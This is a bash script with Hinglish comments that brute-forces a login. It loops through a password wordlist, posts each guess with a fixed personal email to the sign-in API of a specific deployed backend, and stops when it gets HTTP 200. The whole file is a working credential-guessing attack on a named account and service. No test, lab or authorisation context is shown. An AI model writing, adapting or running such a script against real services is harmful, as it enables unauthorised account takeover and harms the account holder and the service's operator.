#!/bin/bash

# Sahi variable naming (underscore use kiya hai)
wordlist="passwords.txt"
pro_url="https://vritywire-backend.onrender.com"

trigger() {
    local url="$1"
    
    # File check karne ke liye safe approach
    if [ ! -f "$wordlist" ]; then
        echo "Error: $wordlist file nahi mili!"
        return 1
    fi

    # Loop ke andar rakha hai taaki har password par request jaye
    while IFS= read -r word; do
        [ -z "$word" ] && continue # Empty lines skip karne ke liye
        
        echo "Trying password: $word"

        # HTTP Status code capture karne ka sahi tareeqa
        status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${url}/api/auth/signin" \
             -H "Content-Type: application/json" \
             -d "{\"email\":\"dumnekaran3@gmail.com\",\"password\":\"$word\"}")

        echo "Status Code: $status"

        # Condition check (space zaroori hai brackets ke andar)
        if [ "$status" -eq 200 ]; then
            echo "[+] Success! Password mil gaya: $word"
            break # Milte hi loop rokne ke liye
        else
            echo "[-] Invalid password."
        fi
        
        echo "-----------------------------------"
    done < "$wordlist"
}

# Function call
trigger "$pro_url"
